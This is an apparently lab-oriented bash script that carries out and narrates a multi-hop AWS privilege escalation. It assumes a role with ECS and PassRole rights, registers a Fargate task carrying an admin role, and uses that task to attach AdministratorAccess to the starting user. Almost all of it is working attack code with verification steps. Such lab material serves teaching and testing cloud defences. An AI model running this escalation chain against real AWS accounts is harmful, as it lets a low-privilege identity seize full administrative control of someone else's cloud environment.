#!/bin/bash

# Demo script for STS AssumeRole + ECS PassRole multi-hop privilege escalation
# This scenario demonstrates a two-hop attack:
#   Hop 1: Starting user assumes a role with ECS permissions
#   Hop 2: Use the role's PassRole + ECS permissions to run a task with an admin role


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-sts001-ecs002-starting-user"
STARTING_ROLE="pl-prod-sts001-ecs002-starting-role"
ADMIN_ROLE="pl-prod-sts001-ecs002-admin-role"
CLUSTER_NAME="pl-prod-sts001-ecs002-attack-cluster"
TASK_FAMILY="pl-sts001-ecs002-admin-escalation"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}STS AssumeRole + ECS PassRole${NC}"
echo -e "${GREEN}Multi-Hop Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

echo -e "${BLUE}Attack Path:${NC}"
echo "starting_user -> (sts:AssumeRole) -> starting_role"
echo "             -> (iam:PassRole + ecs:CreateCluster + ecs:RegisterTaskDefinition + ecs:RunTask)"
echo "             -> admin_role (via ECS task) -> admin access"
echo ""

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_multi_hop_to_admin_sts_001_to_ecs_002_to_admin.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}[OK] Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
export AWS_REGION=$AWS_REGION
unset AWS_SESSION_TOKEN

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}[OK] Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}[OK] Retrieved account ID${NC}\n"

# Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}Warning: Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}[OK] Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 5: Verify we can't create ECS resources directly as starting user
echo -e "${YELLOW}Step 5: Verifying starting user has limited permissions${NC}"
echo "Attempting to create ECS cluster directly (should fail)..."
if aws ecs create-cluster --region $AWS_REGION --cluster-name "test-fail-cluster" &> /dev/null; then
    # Clean up if it unexpectedly worked
    aws ecs delete-cluster --region $AWS_REGION --cluster "test-fail-cluster" &> /dev/null || true
    echo -e "${RED}Warning: Starting user can create ECS clusters directly${NC}"
else
    echo -e "${GREEN}[OK] Confirmed: Starting user cannot create ECS clusters directly (as expected)${NC}"
fi
echo ""

# Step 6: HOP 1 - Assume the starting role
echo -e "${YELLOW}Step 6: HOP 1 - Assuming the starting role with ECS permissions${NC}"
echo -e "${BLUE}Attack Vector: sts:AssumeRole${NC}"
STARTING_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${STARTING_ROLE}"
echo "Target Role: $STARTING_ROLE_ARN"
echo ""

show_attack_cmd "Attacker" "aws sts assume-role --role-arn $STARTING_ROLE_ARN --role-session-name demo-session --query 'Credentials' --output json"
CREDENTIALS=$(aws sts assume-role \
    --role-arn $STARTING_ROLE_ARN \
    --role-session-name demo-session \
    --query 'Credentials' \
    --output json)

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to assume starting role${NC}"
    exit 1
fi

# Extract and set credentials
export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
# Keep region consistent
export AWS_REGION=$AWS_REGION

# Verify we assumed the role
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "New identity: $ROLE_IDENTITY"
echo -e "${GREEN}[OK] Successfully assumed starting role${NC}"
echo ""
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}HOP 1 COMPLETE - Now operating as starting role${NC}"
echo -e "${GREEN}========================================${NC}"
echo ""

# Step 7: Verify the starting role's permissions
echo -e "${YELLOW}Step 7: Verifying starting role permissions${NC}"
echo "The starting role should have ECS and PassRole permissions..."
echo "Still cannot list IAM users (not admin yet)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}Warning: Starting role can list IAM users${NC}"
else
    echo -e "${GREEN}[OK] Starting role cannot list IAM users (expected - limited permissions)${NC}"
fi
echo ""

# Step 8: HOP 2 - Create ECS cluster
echo -e "${YELLOW}Step 8: HOP 2 - Creating ECS cluster${NC}"
echo -e "${BLUE}Attack Vector: ecs:CreateCluster${NC}"
echo "Cluster name: $CLUSTER_NAME"
echo ""

show_attack_cmd "Attacker" "aws ecs create-cluster --region $AWS_REGION --cluster-name "$CLUSTER_NAME" --output json"
CLUSTER_RESULT=$(aws ecs create-cluster \
    --region $AWS_REGION \
    --cluster-name "$CLUSTER_NAME" \
    --output json)

if [ $? -eq 0 ]; then
    CLUSTER_ARN=$(echo "$CLUSTER_RESULT" | jq -r '.cluster.clusterArn')
    echo "Cluster ARN: $CLUSTER_ARN"
    echo -e "${GREEN}[OK] Successfully created ECS cluster${NC}"
else
    echo -e "${RED}Error: Failed to create ECS cluster${NC}"
    exit 1
fi
echo ""

# Step 9: Get network configuration for Fargate
echo -e "${YELLOW}Step 9: Getting network configuration for Fargate tasks${NC}"
echo "Fargate requires network configuration (VPC and subnet)..."

# Get default VPC
DEFAULT_VPC=$(aws ec2 describe-vpcs \
    --region $AWS_REGION \
    --filters "Name=is-default,Values=true" \
    --query 'Vpcs[0].VpcId' \
    --output text)

if [ -z "$DEFAULT_VPC" ] || [ "$DEFAULT_VPC" == "None" ]; then
    echo -e "${RED}Error: No default VPC found. Fargate requires VPC configuration.${NC}"
    echo "Creating a VPC is beyond the scope of this demo."
    echo "Please ensure a default VPC exists or modify this script to use a custom VPC."
    exit 1
fi

echo "Default VPC: $DEFAULT_VPC"

# Get a subnet from the default VPC
DEFAULT_SUBNET=$(aws ec2 describe-subnets \
    --region $AWS_REGION \
    --filters "Name=vpc-id,Values=$DEFAULT_VPC" \
    --query 'Subnets[0].SubnetId' \
    --output text)

if [ -z "$DEFAULT_SUBNET" ] || [ "$DEFAULT_SUBNET" == "None" ]; then
    echo -e "${RED}Error: No subnet found in default VPC${NC}"
    exit 1
fi

echo "Subnet: $DEFAULT_SUBNET"
echo -e "${GREEN}[OK] Retrieved network configuration${NC}\n"

# Step 10: Register task definition with admin role (PassRole escalation)
echo -e "${YELLOW}Step 10: Registering ECS task definition with admin role${NC}"
echo -e "${BLUE}Attack Vector: iam:PassRole + ecs:RegisterTaskDefinition${NC}"
echo "This is the privilege escalation vector - passing the admin role to ECS task..."
ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${ADMIN_ROLE}"
echo "Admin Role ARN: $ADMIN_ROLE_ARN"
echo ""

# Create task definition that grants admin access to starting user
# The container command uses AWS CLI to attach AdministratorAccess policy
TASK_DEF='{
  "family": "'$TASK_FAMILY'",
  "networkMode": "awsvpc",
  "requiresCompatibilities": ["FARGATE"],
  "cpu": "256",
  "memory": "512",
  "taskRoleArn": "'$ADMIN_ROLE_ARN'",
  "executionRoleArn": "'$ADMIN_ROLE_ARN'",
  "containerDefinitions": [
    {
      "name": "escalation-container",
      "image": "amazon/aws-cli:latest",
      "essential": true,
      "command": [
        "iam",
        "attach-user-policy",
        "--user-name",
        "'$STARTING_USER'",
        "--policy-arn",
        "arn:aws:iam::aws:policy/AdministratorAccess"
      ],
      "logConfiguration": {
        "logDriver": "awslogs",
        "options": {
          "awslogs-create-group": "true",
          "awslogs-group": "/ecs/'$TASK_FAMILY'",
          "awslogs-region": "'$AWS_REGION'",
          "awslogs-stream-prefix": "ecs"
        }
      }
    }
  ]
}'

show_attack_cmd "Attacker" "aws ecs register-task-definition --region $AWS_REGION --cli-input-json "<task-definition-json>" --output json"
REGISTER_RESULT=$(aws ecs register-task-definition \
    --region $AWS_REGION \
    --cli-input-json "$TASK_DEF" \
    --output json)

if [ $? -eq 0 ]; then
    TASK_DEF_ARN=$(echo "$REGISTER_RESULT" | jq -r '.taskDefinition.taskDefinitionArn')
    TASK_DEF_REVISION=$(echo "$REGISTER_RESULT" | jq -r '.taskDefinition.revision')
    echo "Task Definition ARN: $TASK_DEF_ARN"
    echo "Revision: $TASK_DEF_REVISION"
    echo -e "${GREEN}[OK] Successfully registered task definition with admin role!${NC}"
else
    echo -e "${RED}Error: Failed to register task definition${NC}"
    exit 1
fi
echo ""

# Step 11: Run the ECS task on Fargate
echo -e "${YELLOW}Step 11: Running ECS task on Fargate${NC}"
echo -e "${BLUE}Attack Vector: ecs:RunTask${NC}"
echo "This task will use the admin role to grant admin access to our starting user..."

show_attack_cmd "Attacker" "aws ecs run-task --region $AWS_REGION --cluster "$CLUSTER_NAME" --task-definition "$TASK_FAMILY" --launch-type FARGATE --network-configuration "awsvpcConfiguration={subnets=[$DEFAULT_SUBNET],assignPublicIp=ENABLED}" --output json"
RUN_TASK_RESULT=$(aws ecs run-task \
    --region $AWS_REGION \
    --cluster "$CLUSTER_NAME" \
    --task-definition "$TASK_FAMILY" \
    --launch-type FARGATE \
    --network-configuration "awsvpcConfiguration={subnets=[$DEFAULT_SUBNET],assignPublicIp=ENABLED}" \
    --output json)

if [ $? -eq 0 ]; then
    TASK_ARN=$(echo "$RUN_TASK_RESULT" | jq -r '.tasks[0].taskArn')
    echo "Task ARN: $TASK_ARN"
    echo -e "${GREEN}[OK] Successfully started ECS task${NC}"
else
    echo -e "${RED}Error: Failed to run ECS task${NC}"
    exit 1
fi
echo ""

# Step 12: Wait for task to complete
echo -e "${YELLOW}Step 12: Waiting for ECS task to complete${NC}"
echo "Monitoring task status (this may take 1-2 minutes)..."
echo ""

MAX_WAIT=180  # Maximum wait time in seconds (3 minutes for Fargate cold start)
WAIT_INTERVAL=10
ELAPSED=0

while [ $ELAPSED -lt $MAX_WAIT ]; do
    TASK_STATUS=$(aws ecs describe-tasks \
        --region $AWS_REGION \
        --cluster "$CLUSTER_NAME" \
        --tasks "$TASK_ARN" \
        --query 'tasks[0].lastStatus' \
        --output text)

    echo "Task status: $TASK_STATUS (waited ${ELAPSED}s)"

    if [ "$TASK_STATUS" == "STOPPED" ]; then
        echo -e "${GREEN}[OK] Task completed${NC}"

        # Check exit code
        EXIT_CODE=$(aws ecs describe-tasks \
            --region $AWS_REGION \
            --cluster "$CLUSTER_NAME" \
            --tasks "$TASK_ARN" \
            --query 'tasks[0].containers[0].exitCode' \
            --output text)

        if [ "$EXIT_CODE" == "0" ]; then
            echo -e "${GREEN}[OK] Task exited successfully (exit code: 0)${NC}"
            break
        else
            echo -e "${YELLOW}Warning: Task exited with code: $EXIT_CODE${NC}"
            # Get stopped reason
            STOPPED_REASON=$(aws ecs describe-tasks \
                --region $AWS_REGION \
                --cluster "$CLUSTER_NAME" \
                --tasks "$TASK_ARN" \
                --query 'tasks[0].stoppedReason' \
                --output text)
            echo "Stopped reason: $STOPPED_REASON"
            break
        fi
    fi

    sleep $WAIT_INTERVAL
    ELAPSED=$((ELAPSED + WAIT_INTERVAL))
done

if [ $ELAPSED -ge $MAX_WAIT ]; then
    echo -e "${YELLOW}Warning: Task did not complete within ${MAX_WAIT} seconds${NC}"
    echo "The task may still be running. Proceeding to verify admin access..."
fi
echo ""

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}HOP 2 COMPLETE - ECS task with admin role executed${NC}"
echo -e "${GREEN}========================================${NC}"
echo ""

# Step 13: Wait for IAM policy propagation
echo -e "${YELLOW}Step 13: Waiting for IAM policy propagation${NC}"
echo "Allowing time for IAM changes to propagate..."
sleep 15
echo -e "${GREEN}[OK] IAM policy propagated${NC}\n"

# Step 14: Switch back to starting user credentials
echo -e "${YELLOW}Step 14: Switching back to starting user credentials${NC}"
unset AWS_SESSION_TOKEN
export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
# Keep region consistent
export AWS_REGION=$AWS_REGION

# Verify identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
FINAL_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $FINAL_IDENTITY"
echo -e "${GREEN}[OK] Switched to starting user credentials${NC}\n"

# Step 15: Verify admin access
echo -e "${YELLOW}Step 15: Verifying administrator access${NC}"
echo "Attempting to list IAM users with starting user credentials..."
echo "(The ECS task should have attached AdministratorAccess to starting user)"
echo ""

show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo ""
    echo -e "${GREEN}[OK] Successfully listed IAM users!${NC}"
    echo -e "${GREEN}[OK] ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}[FAIL] Failed to list users${NC}"
    echo -e "${YELLOW}The ECS task may have failed. Check CloudWatch logs:${NC}"
    echo "  Log Group: /ecs/$TASK_FAMILY"
    exit 1
fi
echo ""

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

# Summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}MULTI-HOP PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER"
echo "   (with sts:AssumeRole permission)"
echo ""
echo "2. HOP 1: STS AssumeRole"
echo "   - Assumed role: $STARTING_ROLE"
echo "   - Gained ECS and PassRole permissions"
echo ""
echo "3. HOP 2: ECS PassRole Escalation"
echo "   - Created ECS cluster: $CLUSTER_NAME"
echo "   - Registered task definition with admin role: $ADMIN_ROLE"
echo "   - Ran ECS Fargate task that attached AdministratorAccess to starting user"
echo ""
echo "4. Achieved: Full administrator access for $STARTING_USER"

echo -e "\n${YELLOW}Attack Path Diagram:${NC}"
echo -e "  $STARTING_USER"
echo -e "  |"
echo -e "  | (sts:AssumeRole)"
echo -e "  v"
echo -e "  $STARTING_ROLE [with ECS + PassRole permissions]"
echo -e "  |"
echo -e "  | (ecs:CreateCluster)"
echo -e "  v"
echo -e "  $CLUSTER_NAME"
echo -e "  |"
echo -e "  | (iam:PassRole + ecs:RegisterTaskDefinition)"
echo -e "  v"
echo -e "  Task Definition with $ADMIN_ROLE"
echo -e "  |"
echo -e "  | (ecs:RunTask)"
echo -e "  v"
echo -e "  ECS Task [attaches admin policy to starting user]"
echo -e "  |"
echo -e "  v"
echo -e "  $STARTING_USER -> ADMIN ACCESS"

echo -e "\n${YELLOW}Why This Works:${NC}"
echo "- sts:AssumeRole allows the starting user to become the starting role"
echo "- The starting role has iam:PassRole on the admin role"
echo "- ecs:CreateCluster, ecs:RegisterTaskDefinition, and ecs:RunTask allow running arbitrary code"
echo "- By passing the admin role to an ECS task, the task runs with admin permissions"
echo "- The task can then modify IAM policies to grant admin access to the starting user"

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- ECS Cluster: $CLUSTER_NAME"
echo "- Task Definition: $TASK_FAMILY (revision $TASK_DEF_REVISION)"
echo "- ECS Task: $TASK_ARN"
echo "- IAM Policy: AdministratorAccess attached to $STARTING_USER"
echo "- CloudWatch Log Group: /ecs/$TASK_FAMILY"

echo -e "\n${RED}Warning: The ECS cluster and admin policy attachment persist${NC}"
echo -e "${RED}Warning: ECS clusters may incur minimal charges${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
